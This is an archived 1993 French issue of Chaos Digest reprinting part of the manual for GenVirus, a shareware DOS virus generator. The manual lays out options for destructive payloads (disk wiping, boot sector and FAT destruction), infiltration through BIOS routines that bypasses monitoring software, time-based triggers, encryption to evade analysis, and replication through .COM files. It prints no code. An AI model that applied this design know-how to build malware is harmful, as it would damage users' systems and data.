* FICHIER NON TROUVE: le programme n'a pu trouver les fichiers caches ou
        l'interpreteur de commande COMMAND.COM. Il s'agit certainement
        d'une disquette non-systeme. Ces fichiers doivent se trouver
        dans le repertoire principal.

* DISQUE PROTEGE CONTRE L'ECRITURE: le petit autocollant de protection
        est encore le moyen de protection le plus sur contre
        l'ecriture!

* LECTEUR NON PRET (PORTE OUVERTE): il n'y a pas de disquette dans le
        lecteur ou la porte est restee ouverte.

* SECTEUR NON TROUVE: provient d'une erreur de calcul surement due a un
        secteur BOOT incoherent ou a un formatage special.

* ERREUR D'ECRITURE: erreur du controleur de disque sur operation
        d'ecriture.

* ERREUR DE LECTURE: erreur du controleur de disque sur operation de
        lecture. Mauvaise disquette ou secteur detruit.

* ERREUR GENERALE (DISQUE NON FORMATE): le disque est vierge.

* INSTALLATION DU DRIVER IMPOSSIBLE: aucun point d'entree coherent n'a pu
        etre trouve dans la ROM du BIOS ou celle du controleur de
        disque / disque dur.
        Si c'est votre cas et si vous disposez d'un XT, il n'est
        probablement pas compatible a 100% avec le standard. S'il s'agit
        d'un AT, son BIOS doit egalement s'en ecarter quelque peut.
    ATTENTION: cela ne signifie nullement que vous etes a l'abri de ce
        type d'attaque, il suffit simplement de s'adapter a votre type
        de machine et d'en concevoir un virus specifique !!!
        Il est de toute facon impossible de tenir compte de toutes les
        versions des BIOS de la planete pour ce test. Mais sachez
        qu'une simple recopie sur disquette de votre BIOS permettra
        des lors a un programmeur mal intentionne la conception d'un
        driver adapte a votre machine.

* SECTEUR BOOT INCOHERENT: le secteur BOOT presente des anomalies en ce
        qui concerne le nombre d'octets par secteur, le nombre de FAT,
        le nombre de secteurs par piste, de secteurs par cluster, de
        secteurs reserves, etc.









         DOCUMENTATION de GENVIRUS V2.00    Page :   12
--

    L'OPTION RETOUR
    ---------------

Cette option referme la fenetre courante et retourne aux choix precedents.
L'appui sur la touche  effectue la meme action.


    LE MENU GENERATEUR
    ==================

ATTENTION:  Pour des raisons de securite, ce menu est volontairement bride
dans la version SHAREWARE de GENVIRUS (voir le menu ENREGISTREMENT, option
SHAREWARE et IDENTIFICATION). Toutefois, les differentes rubriques peuvent
etre consultees librement, seule la partie generation est desactivee.

Le  menu   GENERATEUR  de  GENVIRUS  est  capable  de  creer  des  modules
entierement parametrables par l'utilisateur en agissant sur:

        - l'action du module;
        - la strategie du module;
        - le declenchement du module;
        - le camouflage du module;
        - la reproduction du module;
        - la fabrication du module.

Le programme affiche l'ecran suivant:

+-------------------------------------------------------------------+
|    Fin        Test +------ GENERATEUR ------+ Enregistrement      |
+--------------------|                        |---------------------+
                     | Avertissement          |
                     | acTion du module       |
                     | Strategie du module    |
                     | Declenchement du module|
                     | Camouflage du module   |
                     | reProduction du module |
                     | Fabrication            |
                     | Retour                 |
                     +------------------------+

IMPORTANT:   pour toutes  les actions  disque suivantes,  la  reaction  du
module NE  PORTERA QUE  sur le drive contenant, au moment du lancement, le
programme infeste  et ceci,  meme si le drive courant ou actuel n'est plus
identique. Par  exemple, si  le programme  contamine  se  trouve  dans  le
lecteur A:, il est donc lance a partir de celui-ci. Lors du declenchement,
l'utilisateur travaille  sur le disque C:. Ce sera alors le lecteur A: qui
se mettra en route et qui sera la cible des agissements du module.

EXPLICATIONS DES RUBRIQUES:
---------------------------

Pour toutes  les rubriques  suivantes, la  selection ou  deselection  d'un
choix se  fait par appui sur . Certaines options sont exclusives et
dans ce  cas, leur  selection efface  automatiquement celles  qui seraient
incompatibles.




         DOCUMENTATION de GENVIRUS V2.00    Page :   13
--

----> AVERTISSEMENT
      -------------
Affiche un texte d'avertissement.
----> ACTION DU MODULE
      ----------------
Permet de  choisir le type d'action que va effectuer le module lors de son
declenchement.
-----------------------------------------------------------------------+
        Test  +----- GENERATEUR ------+ Enregistrement       Aide      |
--------------|                       |--------------------------------+
              | Avertissement         |
              | acTion du mo+----------- ACTION du MODULE -----------+
              | Strategie du|                                        |
              | Declenchemen|   Blocage clavier                      |
              | Camouflage d|   Blocage controleur de disque         |
              | reProduction|   Defaut controleur video              |
              | Fabrication |   Defaut de memoire                    |
              | Retour      |   Effacement d'un fichier              |
              +-------------|   Effacement des fichiers .EXE et .COM |
                            |   Effacement de tous les fichiers      |
                            |   Effacement d'une piste               |
                            |   Effacement total du disque           |
                            |   Destruction de la table FAT          |
                            |   Destruction du repertoire            |
                            |   Destruction du secteur BOOT          |
                            |   Retour                               |
                            +----------------------------------------+

* BLOCAGE CLAVIER: provoque le detournement de l'interruption clavier
INT 09 directement sur l'INT 11 (determination de la configuration du PC).
Aucun traitement n'etant effectue, les appuis touches restent sans effet.

*  BLOCAGE   CONTROLEUR  DE   DISQUE:   provoque   le    detournement   de
l'interruption disque INT 13 directement sur l'INT 11 (determination de la
configuration du  PC). Aucun  traitement n'etant  effectue, les  acces  au
disque en lecture ou en ecriture restent sans effet.

* DEFAUT  CONTROLEUR VIDEO: provoque   le detournement  de  l'interruption
video INT  10 directement  sur l'INT 11 (determination de la configuration
du PC).  Aucun traitement  n'etant effectue,  les acces  a la video par le
BIOS ou  le DOS  ne se  font plus.  Dans ces conditions, un DIR au clavier
allumera la  LED d'acces  disque, mais aucun affichage ne se produira. Par
contre, un  programme ecrivant  directement  en  RAM  video  ne  sera  pas
perturbe.

* DEFAUT DE MEMOIRE: provoque l'affichage du  message suivant

    Erreur de parite memoire
    Systeme bloque.

et procede au blocage du CPU. Faire un RESET par .







         DOCUMENTATION de GENVIRUS V2.00    Page :   14
--

* EFFACEMENT  D'UN FICHIER:    le programme   demande le  nom du fichier a
effacer ainsi  que son  extension MAIS  sans le chemin. Le moment venu, le
module effectuera  une recherche  de fichier  UNIQUEMENT sur le repertoire
principal du  disque (ROOT). Dans le cas ou le fichier serait absent, rien
ne se  passera. Les  caracteres 'JOCKERS' * ou ? ne sont pas autorises. Si
le nom  du fichier  a supprimer  correspond a  un sous-repertoire, il sera
efface ainsi  que les programmes contenus dans celui-ci. L'effacement d'un
fichier s'effectue  en substituant  la premiere  lettre de  son nom par le
code 0E5h.

* EFFACEMENT  DES FICHIERS .EXE ET .COM:  au declenchement du module, tous
les fichiers programmes .EXE et .COM presents dans le repertoire principal
(ROOT) seront  supprimes (y compris COMMAND.COM). Seront egalement effaces
les fichiers  caches, systemes  ou  a  lecture  seule.  L'effacement  d'un
fichier s'effectue  en substituant  la premiere  lettre de  son nom par le
code 0E5h.

* EFFACEMENT  DE TOUS  LES FICHIERS:  au declenchement du module, tous les
fichiers presents  dans le  repertoire principal  (ROOT) seront  supprimes
(ceci  concerne   les  programmes,   les  fichiers   de  donnees   et  les
repertoires). Seront  egalement effaces les fichiers caches, systemes ou a
lecture seule.  L'effacement d'un  fichier s'effectue  en  substituant  la
premiere lettre de son nom par le code 0E5h.

* EFFACEMENT  D'UNE PISTE: effectue l'effacement  de la piste  situe a 75%
de la  capacite du support. Tous les secteurs de la piste sont forces avec
des zeros.

* EFFACEMENT  TOTAL DU  DISQUE:   au declenchement  du  module,  tous  les
secteurs du disque sont forces avec des zeros.

* DESTRUCTION  DE LA  TABLE FAT:  au  declenchement  du  module, tous  les
octets constituant le premier secteur de la FAT (512 octets) sont inverses
deux a deux (le premier octet devient le second, le deuxieme le premier).

* DESTRUCTION  DU REPERTOIRE:  au declenchement du module, tous les octets
constituant le  premier secteur  du repertoire principal ROOT (512 octets)
sont inverses deux a deux (le premier octet devient le second, le deuxieme
le premier).

* DESTRUCTION  DU SECTEUR  BOOT:  au declenchement  du module,   tous  les
octets constituant  le premier  secteur du BOOT (512 octets) sont inverses
deux a deux (le premier octet devient le second, le deuxieme le premier).

* RETOUR: Cette  option referme  la fenetre courante  et retourne au choix
precedent. L'appui sur la touche  effectue la meme action.













         DOCUMENTATION de GENVIRUS V2.00    Page :   15
--

----> STRATEGIE DU MODULE
      -------------------

-------------------------------------------------------------------+
    Test  +----- GENERATEUR ------+ Enregistrement       Aide      |
----------|                       |--------------------------------+
          | Avertissement         |
          | acTion du module      |
          | Strategie du module   |
          | Declenchement+------- STRATEGIE du MODULE -------+
          | Camouflage du|                                   |
          | reProduction |   infiltration par DOS  (INT 21)  |
          | Fabrication  |   infiltration par BIOS (INT 13)  |
          | Retour       |   infiltration par driver Special |
          +--------------|   Retour                          |
                         +-----------------------------------+

* INFILTRATION PAR DOS (INT 21): toutes les actions disques utiliseront
les services de l'interruption DOS INT 21 pour acceder aux secteurs ou aux
fichiers du support concerne. Le choix de cette option aura egalement une
incidence sur le declenchement du module pour une date ou une heure
donnee. L'apparition de cet evenement ne suffira pas a autoriser le
declenchement de la partie action du module. En effet, il faudra egalement
que le DOS ne soit pas deja occupe (verification de l'activite du DOS par
consultation du flag 'INDOS'). Cela veut dire que le module ne se
declenchera pas tout seul a l'invite du DOS mais dans un programme ou
immediatement apres un acces disque.

Il faut donc noter qu'un eventuel acces malhonnete au disque sera tres
difficile a remarquer puisque la LED du drive concerne indiquera deja une
activite en cours. Mais par ailleurs, comme ces actions utilisent
l'interruption 21 du DOS, elles seront facilement controlables par
n'importe quel programme de protection.

* INFILTRATION PAR BIOS (INT 13): toutes les actions disques utiliseront
les services de l'interruption BIOS INT 13 pour acceder aux secteurs ou
aux fichiers du support concerne. Comme pour l'interruption 21, le choix
de cette option aura une incidence sur le declenchement du module pour une
date ou une heure donnee. L'apparition de cet evenement suffira
generalement pour declencher la partie action du module qui aura donc lieu
au beau milieu d'un programme ou a l'invite du DOS (le flag 'INDOS' n'est
pas teste). Toutefois, certains programmes retardent ou bloquent ce
declenchement, ce dernier aura alors lieu des la sortie du programme
concerne.

En resume, pour les infiltrations par l'interruption 13, on remarque une
moins grande discretion qu'au declenchement par l'INT 21 et comme ces
dernieres, elles seront facilement controlables par un quelconque
programme interceptant cette interruption.










         DOCUMENTATION de GENVIRUS V2.00    Page :   16
--

* INFILTRATION PAR DRIVER SPECIAL: toutes les actions disque utiliseront
les services de l'interruption BIOS inscrite en ROM pour acceder aux
secteurs ou aux fichiers du support concerne. Le module va donc effectuer
une recherche dynamique du point d'entree des routines de gestion disque
soit dans la ROM du BIOS pour un lecteur de disque souple, soit dans la
ROM disque dur pour un disque fixe. Cette recherche est du type dynamique
car le point d'entree est fonction de la marque de votre BIOS ou de celle
du disque dur. Une verification de coherence est effectuee mais il se peut
que votre machine s'eloigne par trop du standard PC (la fameuse
compatibilite) et dans ce cas, le module restera a jamais inactif (lire
toutefois page 12 la rubrique concernant le message: INSTALLATION DU
DRIVER IMPOSSIBLE).

Les caracteristiques de ce type de driver sont donc identiques a celles
indiquees pour l'interruption 13 avec cependant une difference de taille,
l'impossibilite d'empecher l'acces au disque par un programme de
surveillance puisqu'aucun appel a une interruption situee dans la table
des vecteurs d'interruption en RAM n'est effectuee.

DANS CE CAS, AUCUNE PROTECTION LOGICIELLE N'EST PLUS A ESPERER !!!


* RETOUR: Cette option referme la fenetre courante et retourne aux choix
precedents. L'appui sur la touche  effectue la meme action.


----> DECLENCHEMENT DU MODULE
      -----------------------

-------------------------------------------------------------------+
    Test +----- GENERATEUR -------+ Enregistrement       Aide      |
---------|                        |--------------------------------+
         |  Avertissement         |
         | acTion du module       |
         | Strategie du module    |
         | Declenchement du module|
         | Camouflage du +-- DECLENCHEMENT du MODULE ---+
         | reProduction d|                              |
         | Fabrication   |   des Execution du programme |
         | Retour        |   pour une Date donnee       |
         +---------------|   pour une Heure donnee      |
                         |   sur action Clavier         |
                         |   Retour                     |
                         +------------------------------+

* DES EXECUTION DU PROGRAMME: le module action devient actif des le
lancement du programme. Il n'effectuera plus aucune intervention par la
suite.











         DOCUMENTATION de GENVIRUS V2.00    Page :   17
--

* POUR UNE DATE DONNEE: le programme ouvre une fenetre et vous demande
la date de declenchement souhaitee ainsi que le format de la reponse:
JJ/MM/AAAA (ne pas oublier les '/'). Si votre date est valide, l'option
est conservee. Dans le cas contraire, un message d'erreur apparait a
l'ecran et l'option declenchement par date est desactivee (les dates
programmables vont bien au-dela de l'esperance de vie des PC). Le
declenchement aura lieu le jour meme a 0H00 ou des le lancement du
programme si la date est depassee.

* POUR UNE HEURE DONNEE: le programme ouvre une fenetre et vous demande
l'heure de declenchement souhaitee ainsi que le format de la reponse:
HH:MM (attention au ':'). Si votre heure est valide, l'option est
conservee. Dans le cas contraire, un message d'erreur apparait a l'ecran
et l'option declenchement par heure est desactivee. Le declenchement aura
lieu journellement a la coincidence de l'horloge interne et de l'heure
programmee ou des le lancement du programme si l'horloge interne indique
une heure plus grande que celle memorisee et ce, jusqu'a minuit.

* SUR ACTION CLAVIER : le declenchement du noyau action aura lieu sur
appui de la barre espace a condition que le DOS ne soit pas en activite
(flag 'INDOS' a 0). Le declenchement n'aura donc pas lieu a l'invite du
DOS mais dans un programme ou dans une application lors d'une saisie au
clavier. Pour plus de details, voir la rubrique INFILTRATION PAR DOS
(INT 21).

* RETOUR: Cette option referme la fenetre courante et retourne aux choix
precedents. L'appui sur la touche  effectue la meme action.


----> CAMOUFLAGE DU MODULE
      --------------------

-------------------------------------------------------------------+
    Test +------ GENERATEUR ------+ Enregistrement       Aide      |
---------|                        |--------------------------------+
         | Avertissement          |
         | acTion du module       |
         | Strategie du module    |
         | Declenchement du module|
         | Camouflage du module   |
         | reProd+------------- CAMOUFLAGE du MODULE --------------+
         | Fabrib|                                                 |
         | Retour|   module ecrasant le programme hote             |
         +-------|   module s'inserant dans le programme hote      |
                 |   module code ecrasant le programme hote        |
                 |   module code s'inserant dans le programme hote |
                 |   Retour                                        |
                 +-------------------------------------------------+











         DOCUMENTATION de GENVIRUS V2.00    Page :   18
--

* MODULE ECRASANT LE PROGRAMME HOTE: le module recouvre les codes du
programme hote par son propre code. Il garde le nom, les attributs, la
date de creation et la taille de celui-ci (a la condition que le programme
hote soit au moins aussi grand que le module genere sinon sa taille sera
augmentee d'autant). Le module ayant remplace le code du programme
original par le sien, ce programme ne fonctionnera plus et au lancement de
celui-ci vous retournerez directement au DOS, mais le noyau attente du
module sera desormais en place.

        MODULE ECRASANT AVANT L'INFECTION :
        -----------------------------------
+-------------------+
|       MODULE      |
+-------------------+
+-----------------------------------+
|         PROGRAMME HOTE            |
+-----------------------------------+

        APRES L'INFECTION :
        -------------------
+-------------------+---------------+
|       MODULE      | FIN PRG HOTE  |
+-------------------+---------------+

* MODULE S'INSERANT DANS LE PROGRAMME HOTE: ce genre de module possede la
particularite de ne pas detruire le programme hote, celui-ci pourra
fonctionner normalement mais a la suite du module. Il gardera le nom, les
attributs, la date de creation mais sa taille augmentera. Il sera donc
detecte par les logiciels calculant les checksums des fichiers. Pour ce
faire, l'installation du module s'effectue en 2 temps:

    - la portion de code du programme source correspondant a la taille du
module est transferee a la fin du programme source.

    - le module s'insere ensuite au debut du programme source dans la
partie devenue inutile.

        MODULE INSERANT AVANT L'INFECTION :
        -----------------------------------
+-------------------+
|       MODULE      |
+-------------------+
+----------------------------------+
|         PROGRAMME HOTE           |
+----------------------------------+

    PREMIER TEMPS DE L'INFECTION (transfert debut programme a sa fin):
    ----------------------------
                    +--------------+-------------------+
                    | FIN PRG HOTE |  DEBUT PRG HOTE   |
                    +--------------+-------------------+







         DOCUMENTATION de GENVIRUS V2.00    Page :   19
--

    DEUXIEME TEMPS DE L'INFECTION (mise en place du module) :
    -----------------------------
+-------------------+--------------+-------------------+
|       MODULE      | FIN PRG HOTE |  DEBUT PRG HOTE   |
+-------------------+--------------+-------------------+

De cette maniere, la partie de code du module sera executee avant celle du
programme hote et donc des le lancement du programme contamine. Neanmoins,
avant de transferer le controle au programme original, le module doit
effectuer la remise en condition initiale dans le bon ordre des portions
de code de celui-ci.

* MODULE CODE ECRASANT LE PROGRAMME HOTE: les parties actives du module
sont codees. De cette facon, les utilitaires d'analyse de programme qui
recherchent les appels aux routines d'interruptions comprenant des
ecritures sur disque ne detecteront pas celles du module et vous
assureront de sa parfaite inocuite. Les autres caracteristiques sont
identiques a celles du module ecrasant le programme hote (voir plus haut).

* MODULE CODE S'INSERANT DANS LE PROGRAMME HOTE: les parties actives du
module sont codees. De cette facon, les utilitaires d'analyse de programme
qui recherchent les appels aux routines d'interruption comprenant des
ecritures sur disque ne detecteront pas celles du module et vous
assureront de sa parfaite inocuite. Les autres caracteristiques sont
identiques a celles du virus s'inserant dans le programme hote (voir plus
haut).


* RETOUR  : Cette option referme la fenetre courante et retourne aux choix
precedents. L'appui sur la touche  effectue la meme action.


----> REPRODUCTION DU MODULE
      ----------------------

-------------------------------------------------------------------+
    Test +------ GENERATEUR ------+ Enregistrement       Aide      |
---------|                        |--------------------------------+
         | Avertissement          |
         | acTion du module       |
         | Strategie du module    |
         | Declenchement du module|
         | Camouflage du module   |
         | reProduction du module |
         | Fabrication   +------- REPRODUCTION du MODULE --------+
         | Retour        |                                       |
         +---------------|   le module ne doit Pas se reproduire |
                         |   le module Doit se reproduire        |
                         |   Retour                              |
                         +---------------------------------------+

* LE MODULE NE DOIT PAS SE REPRODUIRE: le module restera dans le
programme que vous aurez designe et ne se reproduira pas.






         DOCUMENTATION de GENVIRUS V2.00    Page :   20
--

* LE MODULE DOIT SE REPRODUIRE: le module comprendra une partie
reproduction qui se declenchera a chaque lancement du premier programme
contamine ou d'un des programmes qui aura lui-meme deja ete contamine. La
partie reproduction repond aux regles suivantes:

        - seuls les programmes .COM seront contamines.

        - le module ne se reproduira jamais dans COMMAND.COM ainsi que
          dans les fichiers SYSTEMES, que ce soient des .SYS ou des
          .COM. Par contre, il sera possible de contaminer manuellement
          COMMAND.COM en indiquant son nom comme fichier devant
          contenir le module dans le menu FABRICATION DU VIRUS.

        - tous les autres programmes .COM qui ne seraient pas des
          fichiers systemes seront contamines, meme s'ils possedent le
          flag 'FICHIER CACHE' ou 'FICHIER A LECTURE SEULE'.

        - un fichier ne pourra etre contamine qu'une seule fois.

        - chaque lancement d'un programme contamine devant se multiplier
          declenche la contamination d'UN SEUL autre programme. Aucune
          autre tentative de reproduction ne sera effectuee durant le
          deroulement du programme hote.
          Pour cela, au moins un programme sain doit se trouver dans
          le repertoire courant.

        - la contamination ne s'etend qu'a l'interieur du repertoire
          courant.

        - s'il n'existe plus de fichier a contaminer, la reproduction
          sera simplement ignoree.

        - pour des raisons evidentes de securite, la reproduction des
          modules n'utilise QUE les services de l'INT 21 afin de
          rester facilement contenable et reperable par les logiciels
          de detection. La non-contamination des fichiers systemes
          repond aux memes imperatifs.

* RETOUR: Cette option referme la fenetre courante et retourne aux choix
precedents. L'appui sur la touche  effectue la meme action.



















         DOCUMENTATION de GENVIRUS V2.00    Page :   21

------------------------------

End of Chaos Digest #1.55
************************************

Chaos Digest              Samedi 19 Juin 1993        Volume 1 : Numero 56
                            ISSN  1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.56 (19 Juin 1993)
File 1--_GenVirus_, premier geneur de virus francais [#3] (manuel)
File 2--_Netz-Tage '93 (NeT)_ (annonce)
File 3--Dictionnaire tres special pour PC (logiciel)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found from the ComNet in Luxembourg BBS (+352)
466893.  Back issues of ChaosD can be found on the Internet as part of the
Computer underground Digest archives. They're accessible using anonymous FTP:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * cs.ubc.ca [137.82.8.5] in /mirror3/EFF/cud/chaos
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: THU JUN 17 15:15:40 -0400 1993
From: Jacques.Struss@email.teaser.com (Jacques Struss )
Subject: File 1--_GenVirus_, premier geneur de virus francais [#3] (manuel)


----> FABRICATION DU MODULE
      ---------------------

-------------------------------------------------------------------+
    Test +------ GENERATEUR ------+ Enregistrement       Aide      |
---------|                        |--------------------------------+
         | Avertissement          |
         | acTion du module       |
         | Strategie du module    |
         | Declenchement du module|
         | Camouflage du module   |
         | reProduction du module |
         | Fabrication            |
         | Ret+------------- FABRICATION du MODULE --------------+
         +----|                                                  |
              | fabrication d'un module Autonome                 |
              | fabrication du module dans un programme Existant |
              | Retour                                           |
              +--------------------------------------------------+

* FABRICATION D'UN MODULE AUTONOME: le module que vous avez elabore est
inscrit sur le disque courant sous le nom de VIRUS.COM. Il ne sera actif
que lors de son lancement.

ATTENTION: si vous avez choisi un module devant se reproduire, vous
devrez choisir la fabrication dans un programme existant.

* FABRICATION DU MODULE DANS UN PROGRAMME EXISTANT: le programme ouvre
une fenetre et vous demande le nom du fichier a contaminer qui doit etre
un programme .COM et se trouver dans le repertoire courant. GENVIRUS
s'assure egalement que le fichier ne soit pas deja contamine avant de
proceder a sa modification.

    - Augmentation de taille : dans le cas ou le module est inserant,
l'augmentation de taille du programme resultant est fonction de celle du
programme original. Elle sera plus importante pour les programmes hotes de
taille inferieure a environ 1K (cela dependra des fonctions de votre
module) que ceux superieurs a cette limite.

Avant que la fabrication du module ne soit lancee, le programme vous
demande de lui indiquer votre mot de passe personnel. Celui-ci sera valide
par .

Si la fabrication de votre module c'est bien deroulee, l'ecran affiche le
message suivant:














         DOCUMENTATION de GENVIRUS V2.00    Page :   22
--

   +--------------------------------------------------------------+
   |                                                              |
   |               Fabrication du module reussie.                 |
   |                                                              |
   | ATTENTION, le programme que vous avez genere possede les     |
   |  caracteristiques suffisantes (entraves au fonctionnement    |
   |  des systemes informatiques et alterations ou destructions   |
   |  d'informations) pour etre qualifie de:                      |
   |                                                              |
   |                    VIRUS  INFORMATIQUE.                      |
   |                                                              |
   | Le maniement de ce programme n'est PAS un JEU. Il ne doit    |
   |  servir qu'a l'evaluation de VOTRE materiel et ne jamais     |
   |  etre diffuse sous quelque forme que ce soit.                |
   |                                                              |
   | Le programme ELIMGVIR.exe vous permettra de proceder au      |
   |  reperage ou a l'elimination des logiciels infectes par      |
   |  votre module de test.                                       |
   |                                                              |
   +--------------------------------------------------------------+

* RETOUR: Cette option referme la fenetre courante et retourne aux choix
precedents. L'appui sur la touche  effectue la meme action.

    LE MENU ENREGISTREMENT
    ======================

LE SHAREWARE
------------
C'est un logiciel distribue gratuitement, autorisant ainsi son evaluation
par l'utilisateur. Sa copie est libre et sa diffusion vivement encouragee.
Toutefois, le programme peut presenter des fonctions non disponibles dans
la version Shareware (il est pour ainsi dire bride). Par contre, dans la
version dite avec licence (c'est-a-dire possedant un numero d'enregistrement
et dont les droits auront ete acquis par une modeste retribution a
l'auteur), le programme possedera toutes les fonctionnalites proposees et
surtout la toute derniere version du programme. De plus, vous disposerez
d'une assistance technique d'un an et serez tenus au courant de l'evolution
du produit. Ce sera egalement le seul moyen de disposer d'une version saine
et certifiee par l'auteur.

L'IDENTIFICATION des MODULES
----------------------------
GenVirus est capable de tester en interne certaines protections contre les
virus, mais  beaucoup de programmes necessitent une attaque externe par un
module independant  pour etre  valides car  ils interrompent en general de
facon trop  brutale et  souvent fatale, l'execution en cours. GenVirus est
donc en  mesure de  generer des programmes (des modules) ayant pour but de
simuler l'action  de vrais  virus. L'avantage  de  cette  methode  est  de
controler pleinement  le declenchement,  le mode  d'action et  la cible de
votre virus   (exemple:  modification de COMMAND.COM ou d'un autre fichier
que vous  aurez choisi).  Ceci vous  permet de  faire des  sauvegardes  ou
copies des fichiers que vous aurez designes car seulement ceux-ci auront a
subir d'eventuelles  attaques. Vous  ne  serez  pas  pris  en  traitre  et
garderez ainsi la maitrise totale de l'evolution de la contagion.





         DOCUMENTATION de GENVIRUS V2.00    Page :   23
--

Cette affirmation  n'est exacte  que pour  vous (car  vous  seul  etes  au
courant) et  toute tierce  personne, ou  systeme sera  par contre  pris au
piege et supportera des lors des desagrements plus ou moins serieux tout a
fait reprehensibles par la loi (voir AVERTISSEMENTS).

Cet etat  de fait  est parfaitement inadmissible et n'est pas le but de ce
programme. Il  ne doit  servir qu'a  vous preparer  a la  lutte contre les
vrais virus  en observant vous-memes les evolutions et les moyens d'action
de ceux-ci  mais en  toute securite. Il devrait egalement servir a balayer
certaines idees  recues et  finalement  dissuader  les  auteurs  de  codes
virulents de  persister dans cette voie, leurs mefaits risquant de plus en
plus de ne pas aboutir.

Helas, personne  n'etant parfait,  il a  fallu mettre  une  barriere  pour
empecher qu'un  irresponsable aille quand-meme diffuser volontairement des
virus chez  autrui. Ceci  explique pourquoi cette possibilite n'existe que
dans la  version avec  licence, l'auteur  se chargeant de personnaliser le
programme par  un identificateur  specifique permettant ainsi de retrouver
la personne qui serait a l'origine de ce delit.


CET IDENTIFICATEUR  SPECIFIQUE SERA INSCRIT DANS TOUS LES PROGRAMMES ISSUS
DE GENVIRUS!


ATTENTION :  Apres avoir mene les essais et tests de votre programme anti-
virus prefere,  vous devrez  absolument  detruire  le  programme  de  test
(module) que  vous aurez  genere afin  de le  neutraliser completement  et
definitivement. Si  vous n'etes  pas un  familier  du  DOS,  le  programme
ELIMGVIR.EXE cherchera  pour vous  les programmes  infectes et procedera a
l'elimination de  ceux presentant  l'empreinte caracteristique des modules
de test issus de GenVirus.

COUT
----
La version complete (avec licence) de GENVIRUS est disponible pour :

        - 130 FF disquette 5 1/4
        - 130 FF disquette 3 1/2

La licence comprend :

    - la derniere version de GenVirus,
    - la personnalisation du programme (identificateur),

Vous aurez  de plus,  la certitude de posseder une version exempte de tout
virus rajoute par un indelicat.

FORMULAIRE
----------

Le formulaire de commande est directement imprimable depuis cette rubrique
apres demande  de confirmation.  Il se  trouve egalement a la fin de cette
documentation.





         DOCUMENTATION de GENVIRUS V2.00    Page :   24
--

    LE MENU AIDE
    ============

UTILISATION DE GENVIRUS
----------------------
Voir page 6 (utilisation de GENVIRUS).

GENVIRUS
--------
Voir page 3 (pourquoi GENVIRUS).

AVERTISSEMENT
-------------
* La copie et la diffusion de ce programme (version non shareware) sont
  rigoureusement interdites. Son usage est prive, c'est a dire que
  l'utilisateur ne peut se servir du programme QUE pour lui-meme.

* La copie et diffusion de la version shareware est par contre libre et
  meme vivement encouragee (a la seule condition que l'ensemble des
  fichiers presents sur la disquette d'origine soit diffuse).

* La diffusion des modules (version non shareware) destines aux tests
  d'efficacite de la protection est INTERDITE par quelque moyen que ce
  soit.

* Ils ne doivent etre utilises qu'aux fins de tests, uniquement par la
  personne realisant ces tests et sur son propre ordinateur.

* Pour ce faire, les modules contiennent un identificateur (version non
  shareware) permettant de retrouver les contrevenants.

* La responsabilite de l'auteur sera degagee en cas de violation de ces
  conditions.

* GenVirus est fourni 'dans l'etat'. Avant son emploi, l'utilisateur doit
  prendre les precautions d'usage (sauvegardes, transferts etc...).

LES VIRUS
---------

    TENTATIVE DE DEFINITION

Un virus informatique est avant tout un programme qui se demarque des
autres logiciels par sa propriete inhabituelle de pouvoir modifier
d'autres programmes ou d'effectuer le moment venu de basses besognes
destructives sans en informer l'utilisateur.

    COMMENT DETECTER LA PRESENCE D'UN VIRUS

Certains phenomenes PEUVENT avoir pour origine la presence d'un virus :
- les temps de chargement s'allongent,
- des erreurs memoires apparaissent aleatoirement,
- l'ordinateur se bloque inexpliquablement,
- des programmes qui n'ont pas besoin de faire des acces au disque dur
  ou a la disquette en effectuent maintenant,
- les programmes semblent tourner plus lentement.




         DOCUMENTATION de GENVIRUS V2.00    Page :   25
--

PROTECTION
----------
Faire une  copie  de  securite  d'un  programme  immediatement  apres  son
acquisition en respectant les points suivants:

    - Eteindre l'ordinateur completement (par le secteur et non par le
        bouton de reset,
    - Charger le systeme a partir d'une disquette DOS originale (de
        provenance indiscutable et protegee en ecriture),
    - Ne jamais demarrer sur disque dur si vous en possedez un!
    - Effectuer les copies avant d'appeler tout autre programme (residant
        ou non),
    - Disposer l'autocollant de protection contre l'ecriture sur les
        copies,
    - Ranger en lieu sur les disquettes originales.
    - Lancer la procedure d'installation depuis les copies ainsi faites.


Vous devez disposer IMPERATIVEMENT des ORIGINAUX ou de COPIES SAINES avant
de manipuler  une disquette susceptible de contenir un virus, c'est-a-dire
helas presque toutes les disquettes.

N'hesitez pas  a indiquer  a votre  entourage les programmes de provenance
douteuse.

LA CONSERVATION  DES DISQUETTES  SAINES EST  VOTRE SEULE VRAIE PROTECTION,
car des  qu'un virus  aura reussi  a s'introduire  dans votre  systeme, la
SEULE et  UNIQUE solution  consistera a effacer (reformater) le disque dur
ou les disquettes et proceder a la reinstallation de tous vos programmes.

    LE MENU FIN
    ===========

Ce menu  vous permet,  apres confirmation,  de quitter  le programme et de
revenir au  DOS. GENVIRUS  vous rend la main sur le lecteur qui a servi au
